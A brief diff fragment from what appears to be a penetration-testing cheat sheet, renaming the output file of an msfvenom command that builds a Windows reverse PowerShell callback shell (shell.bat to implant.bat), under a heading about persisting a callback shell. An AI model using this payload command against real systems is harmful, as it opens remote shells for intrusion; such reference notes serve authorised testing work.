@@ -39,7 +39,7 @@ Persist callback shell.
 ### 4.1 - x86 (32-bit) Payloads
 
 ```
-$ msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f raw -o shell.bat
+$ msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f raw -o implant.bat
 ```
 
 You can load powershell scripts ahead of time.
